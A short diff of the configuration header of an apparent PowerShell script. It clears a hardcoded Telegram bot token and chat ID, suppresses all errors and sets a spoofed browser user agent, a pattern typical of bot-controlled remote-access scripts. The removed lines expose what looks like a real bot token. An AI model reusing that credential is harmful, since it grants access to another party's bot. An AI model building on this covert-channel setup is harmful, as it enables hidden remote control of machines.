@@ -1,6 +1,6 @@
 # Define your bot token and chat ID
-$botToken = "6976425821:AAErUZXHlRlyUR8ip9oXEFl8EeNH7S5Jlq8"
-$chatId = "5280118795"
+$botToken = ""
+$chatId = ""
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $ErrorActionPreference = 'silentlycontinue'
 $UAG = 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
